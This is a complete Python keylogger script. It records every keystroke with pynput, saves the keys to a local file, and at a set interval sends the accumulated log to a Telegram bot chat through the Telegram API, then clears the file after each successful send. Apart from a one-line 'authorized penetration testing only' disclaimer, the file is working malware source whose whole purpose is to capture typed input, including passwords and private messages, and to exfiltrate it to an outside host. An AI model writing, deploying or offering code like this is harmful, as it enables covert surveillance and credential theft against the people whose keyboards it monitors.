"""
Keylogger with Telegram integration
For authorized penetration testing only
"""

import pynput
from pynput.keyboard import Key, Listener
import requests
import time
import threading
import os
from config import *

# Global variables
keys_buffer = []
is_running = True

def send_to_telegram(message):
    """Send message to Telegram chat"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("Telegram configuration missing")
        return False
        
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message
        }
        response = requests.post(url, data=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Error sending to Telegram: {e}")
        return False

def write_to_file(keys):
    """Write keys to local file"""
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k == "Key.space":
                    f.write(" ")
                elif k == "Key.enter":
                    f.write("\n[ENTER]\n")
                elif k == "Key.tab":
                    f.write("\t[TAB]\t")
                elif k == "Key.backspace":
                    f.write("[BACKSPACE]")
                elif k.startswith("Key."):
                    f.write(f"[{k.upper()}]")
                else:
                    f.write(k)
    except Exception as e:
        print(f"Error writing to file: {e}")

def process_and_send_logs():
    """Process accumulated keystrokes and send to Telegram"""
    global keys_buffer
    
    if keys_buffer:
        # Write to local file
        write_to_file(keys_buffer)
        
        # Prepare message to send
        try:
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                log_content = f.read()
            
            if log_content.strip():
                # Limit message size for Telegram
                if len(log_content) > MAX_LOG_SIZE:
                    log_content = log_content[-MAX_LOG_SIZE:]
                
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                message = f"Keylogger Report [{timestamp}]:\n\n{log_content}"
                
                if send_to_telegram(message):
                    # Clear log file after successful send
                    open(LOG_FILE, "w").close()
                    
        except Exception as e:
            print(f"Error processing logs: {e}")
        
        # Clear key buffer after processing
        keys_buffer.clear()

def send_logs_periodically():
    """Continuously send logs at configured interval"""
    while is_running:
        time.sleep(SEND_INTERVAL)
        if is_running:  # Check again after sleep
            process_and_send_logs()

def on_press(key):
    """Handle key press events"""
    global keys_buffer
    keys_buffer.append(key)

def on_release(key):
    """Handle key release events"""
    global is_running
    # Stop logger when ESC is pressed
    if key == Key.esc:
        is_running = False
        process_and_send_logs()  # Send final logs
        return False

def setup():
    """Perform initial setup checks"""
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "your_bot_token_here":
        print("ERROR: Please configure your Telegram bot token in config.py")
        return False
    
    if not TELEGRAM_CHAT_ID or TELEGRAM_CHAT_ID == "your_chat_id_here":
        print("ERROR: Please configure your Telegram chat ID in config.py")
        return False
        
    # Test Telegram connection
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe"
        response = requests.get(url, timeout=5)
        if response.status_code != 200:
            print("ERROR: Invalid Telegram bot token")
            return False
    except Exception as e:
        print(f"ERROR: Cannot connect to Telegram API: {e}")
        return False
        
    return True

def main():
    """Main entry point"""
    print("Keylogger with Telegram Integration")
    print("==================================")
    
    # Initial setup
    if not setup():
        print("Exiting due to configuration errors.")
        return
    
    print(f"Configuration loaded successfully")
    print(f"Log file: {LOG_FILE}")
    print(f"Send interval: {SEND_INTERVAL} seconds")
    print("\nStarting keylogger...")
    print("Press ESC to stop and send final logs")
    
    # Start the log sending thread
    sender_thread = threading.Thread(target=send_logs_periodically, daemon=True)
    sender_thread.start()
    
    # Start the key listener
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        print(f"Error starting keyboard listener: {e}")
    
    print("\nKeylogger stopped. Finalizing...")
    process_and_send_logs()
    print("Goodbye!")

if __name__ == "__main__":
    main()
